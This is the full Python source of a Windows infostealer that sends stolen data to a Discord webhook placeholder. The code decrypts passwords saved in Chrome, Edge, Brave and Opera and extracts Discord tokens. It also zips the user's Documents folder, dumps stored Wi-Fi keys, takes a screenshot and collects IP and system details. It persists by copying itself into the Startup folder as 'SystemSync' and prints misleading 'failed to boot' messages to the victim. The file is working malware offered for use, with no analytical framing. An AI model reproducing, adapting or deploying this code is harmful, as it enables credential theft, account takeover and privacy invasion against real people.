import requests
import os
import zipfile
import tempfile
import shutil
import glob
import re
import socket
import subprocess
import platform
import psutil
import time
import sys
import pyautogui
from io import BytesIO
from os import getenv, listdir, remove, mkdir
from base64 import b64decode
from win32crypt import CryptUnprotectData
from sqlite3 import connect
from Crypto.Cipher import AES
from json import loads

WEBHOOK = "{{WEBHOOK}}"
appdatapath = os.getenv('APPDATA')

class BrowserPasswordExtractor:
    def __init__(self, webhook_url: str):
        self.localAppData = getenv("LOCALAPPDATA")
        self.mainDirectory = getenv("TEMP")  # Temporary directory for processing
        self.webhook_url = webhook_url
        self.passwords = []  # Store extracted passwords

        # Ensure temp directory exists
        if not os.path.exists(self.mainDirectory):
            mkdir(self.mainDirectory)

        # Browser paths (add more if needed)
        self.browsers = {
            "Chrome": os.path.join(self.localAppData, "Google", "Chrome", "User Data"),
            "Edge": os.path.join(self.localAppData, "Microsoft", "Edge", "User Data"),
            "Brave": os.path.join(self.localAppData, "BraveSoftware", "Brave-Browser", "User Data"),
            "Opera": os.path.join(getenv("APPDATA"), "Opera Software", "Opera Stable")
        }

    def get_chrome_master_key(self, local_state_path) -> bytes:
        """Retrieve the master key from Chrome-based browsers."""
        try:
            with open(local_state_path, "r", encoding="utf-8") as file:
                local_state = loads(file.read())
            
            master_key = b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
            return CryptUnprotectData(master_key, None, None, None, 0)[1]
        except Exception as e:
            print(f"Error retrieving master key: {e}")
            return None

    def decrypt_value(self, buff: bytes, master_key: bytes) -> str:
        """Decrypt the password value using AES."""
        try:
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, buff[3:15])
            return cipher.decrypt(payload)[:-16].decode()
        except Exception:
            return ""

    def save_passwords_to_file(self) -> str:
        """Save the passwords to a .txt file and return the file path."""
        file_path = os.path.join(self.mainDirectory, "passwords.txt")
        try:
            with open(file_path, 'w') as file:
                for entry in self.passwords:
                    file.write(f"{entry}\n")
            return file_path
        except Exception as e:
            print(f"Error saving passwords to file: {e}")
            return None

    def send_to_webhook(self, file_path: str) -> None:
        """Send the file to the Discord webhook."""
        with open(file_path, 'rb') as file:
            payload = {
                "username": "Password Extractor Bot"
            }
            files = {
                "file": ("passwords.txt", file)
            }
            try:
                response = requests.post(self.webhook_url, data=payload, files=files)
                if response.status_code != 204:
                    print(f"Failed to send data to webhook: {response.status_code}")
            except requests.exceptions.RequestException as e:
                print(f"Error sending file to webhook: {e}")

    def send_not_found(self) -> None:
        """Send a 'not found' message to the Discord webhook."""
        payload = {
            "content": "No passwords found.",
            "username": "Password Extractor Bot",
        }
        try:
            requests.post(self.webhook_url, json=payload)
        except requests.exceptions.RequestException as e:
            print(f"Error sending 'not found' message to webhook: {e}")

    def retrieve_passwords(self, browser_name: str, login_data_path: str, local_state_path: str) -> None:
        """Retrieve saved passwords from detected browser."""
        possible_locations = ["Default", "Guest Profile"] + [d for d in listdir(login_data_path) if "Profile " in d]

        for location in possible_locations:
            try:
                database_path = os.path.join(login_data_path, location, "Login Data")
                temp_database_path = os.path.join(self.mainDirectory, "LoginData.db")

                # Copy database to temporary location
                shutil.copy2(database_path, temp_database_path)

                with connect(temp_database_path) as database_connection:
                    cursor = database_connection.cursor()
                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")

                    master_key = self.get_chrome_master_key(local_state_path)
                    if master_key is None:
                        continue  # Skip if we can't get the master key

                    for origin_url, username, encrypted_password in cursor.fetchall():
                        decrypted_password = self.decrypt_value(encrypted_password, master_key)
                        if decrypted_password:
                            message = f"Browser: {browser_name}\nURL: {origin_url}\nUsername: {username}\nPassword: {decrypted_password}\n{'-'*50}"
                            self.passwords.append(message)

                            # Stop if we hit the minimum limit of 15
                            if len(self.passwords) >= 15:
                                break

            except Exception as e:
                print(f"Error retrieving passwords from {location} in {browser_name}: {e}")
            finally:
                time.sleep(1)
                # Retry removing temp file if it fails due to being in use
                for attempt in range(3):
                    try:
                        remove(temp_database_path)
                        break
                    except Exception as e:
                        print(f"Error removing temporary database on attempt {attempt + 1}: {e}")
                        time.sleep(1)

    def run(self):
        """Main method to check all browsers and retrieve passwords."""
        for browser_name, login_data_path in self.browsers.items():
            local_state_path = os.path.join(login_data_path, "Local State")
            if os.path.exists(login_data_path) and os.path.exists(local_state_path):
                print(f"Detected {browser_name}. Starting extraction...")
                self.retrieve_passwords(browser_name, login_data_path, local_state_path)
            else:
                print(f"{browser_name} not detected.")

        # After processing all detected browsers, ensure at least 15 passwords were collected
        if self.passwords:
            if len(self.passwords) < 15:
                print(f"Only {len(self.passwords)} passwords found, sending them anyway.")
            file_path = self.save_passwords_to_file()
            if file_path:
                self.send_to_webhook(file_path)
        else:
            self.send_not_found()

def exfiltrate_files():
    documents_folder = os.path.join(os.getenv('USERPROFILE'), 'Documents')

    with tempfile.NamedTemporaryFile(delete=False, suffix='.zip') as temp_zip:
        zip_filename = temp_zip.name
        file_limit = 8 * 1024 * 1024  # 8 MB limit for Discord

        with zipfile.ZipFile(zip_filename, 'w') as zipf:
            total_size = 0
            for root, _, files in os.walk(documents_folder):
                for file in files:
                    filepath = os.path.join(root, file)
                    if os.path.getsize(filepath) < 500 * 1024:  
                        zipf.write(filepath, os.path.relpath(filepath, documents_folder))  
                        total_size += os.path.getsize(filepath)
                        if total_size >= file_limit:
                            return zip_filename  
    return zip_filename

def get_tokens(path):
    tokens = []
    files = glob.glob(path + r"\Local Storage\leveldb\*.ldb")
    files.extend(glob.glob(path + r"\Local Storage\leveldb\*.log"))
    
    for file in files:
        with open(file, 'r', encoding='ISO-8859-1') as content_file:
            try:
                content = content_file.read()
                possible_tokens = [x.group() for x in re.finditer(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[a-zA-Z0-9_\-]{84}', content)]
                if possible_tokens:
                    tokens.extend(possible_tokens)
            except Exception as e:
                print(f"Error reading {file}: {e}")
    return tokens

def send_to_discord(zip_filename, tokens):
    renamed_zip = os.path.join(os.path.dirname(zip_filename), "stolen_files.zip")
    shutil.move(zip_filename, renamed_zip)  

    token_content = f"```css\nPulled {len(tokens)} tokens:\n"
    for token in tokens:
        token_content += token + "\n"
        token_content += '---------------------------------\n'
    token_content += "```"

    payload = {
        "content": token_content,
        "username": "glob 'the data gobler' "
    }

    response = requests.post(WEBHOOK, json=payload)

    if response.status_code == 204:
        print("please wait while we try and boot this file...")

        with open(renamed_zip, "rb") as f:
            file_payload = {'file': f}
            requests.post(WEBHOOK, files=file_payload)

        os.remove(renamed_zip)  
        print("File sent successfully!")
    else:
        print(f"Failed to boot please try again... Status code: {response.status_code}")

def get_public_ip_info():
    try:
        ip_info = requests.get("http://ipinfo.io").json()
        return ip_info
    except Exception as e:
        return {"error": str(e)}

def get_wifi_info():
    wifi_info = []
    try:
        result = subprocess.check_output(["netsh", "wlan", "show", "profiles"], text=True)
        profiles = [line.split(":")[1].strip() for line in result.splitlines() if "All User Profile" in line]

        for profile in profiles:
            profile_info = subprocess.check_output(["netsh", "wlan", "show", "profile", profile, "key=clear"], text=True)
            wifi_info.append(profile_info)
    except Exception as e:
        wifi_info.append(f"Error: {str(e)}")
    
    return "\n\n".join(wifi_info)

def take_screenshot():
    screenshot = pyautogui.screenshot()
    screenshot_buffer = BytesIO()
    screenshot.save(screenshot_buffer, format="PNG")
    screenshot_buffer.seek(0)
    return screenshot_buffer

def get_system_info():
    uname = platform.uname()
    system_info = f"System: {uname.system}\n"
    system_info += f"Node Name: {uname.node}\n"
    system_info += f"Release: {uname.release}\n"
    system_info += f"Version: {uname.version}\n"
    system_info += f"Machine: {uname.machine}\n"
    system_info += f"Processor: {uname.processor}\n"
    
    return system_info

def send_data_to_discord(ip_info, wifi_info, system_info, screenshot_buffer):
    ip_content = f"**IP Information:**\n"
    for key, value in ip_info.items():
        ip_content += f"{key}: {value}\n"

    system_content = f"**System Information:**\n{system_info}"

    wifi_content = f"**Wi-Fi Information:**\n```\n{wifi_info}\n```"

    payload = {
        "content": f"{ip_content}\n{system_content}\n{wifi_content}",
        "username": "Goob 'the info goober' "
    }

    files = {
        "file": ("screenshot.png", screenshot_buffer, "image/png")
    }

    response = requests.post(WEBHOOK, data=payload, files=files)
    if response.status_code == 200:
        print("failed to boot file wait until we retry...")
    else:
        print(f"Failed to boot file please re-open the file...: {response.status_code}")

def main():
    # Exfiltrate files
    zip_filename = exfiltrate_files()

    # Collect system and network info
    ip_info = get_public_ip_info()
    wifi_info = get_wifi_info()
    system_info = get_system_info()
    screenshot_buffer = take_screenshot()

    # Send collected data
    send_data_to_discord(ip_info, wifi_info, system_info, screenshot_buffer)

    # Get tokens
    tokens = []
    paths = [
        os.path.join(appdatapath, 'Discord'),
        os.path.join(appdatapath, 'discordcanary'),
        os.path.join(appdatapath, 'discordptb'),
    ]
    for _dir in paths:
        tokens.extend(get_tokens(_dir))

    if tokens:
        send_to_discord(zip_filename, tokens)
    else:
        print("No tokens found.")

    # Extract passwords
    password_extractor = BrowserPasswordExtractor(WEBHOOK)
    password_extractor.run()

def add_to_startup():
    # Get the path to the Startup folder
    startup_folder = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    
    # Get the current script file path
    current_script = sys.argv[0]
    
   
    destination = os.path.join(startup_folder, 'SystemSync' + os.path.splitext(current_script)[1])  # Use the correct extension (.py or .exe)
    
    try:
        # Copy the script to the startup folder with the new name
        shutil.copy(current_script, destination)
        print(f"Successfully added {destination} to startup!")
    except Exception as e:
        print(f"Failed to add to startup: {e}")

if __name__ == "__main__":
    add_to_startup()


if __name__ == "__main__":
    main()
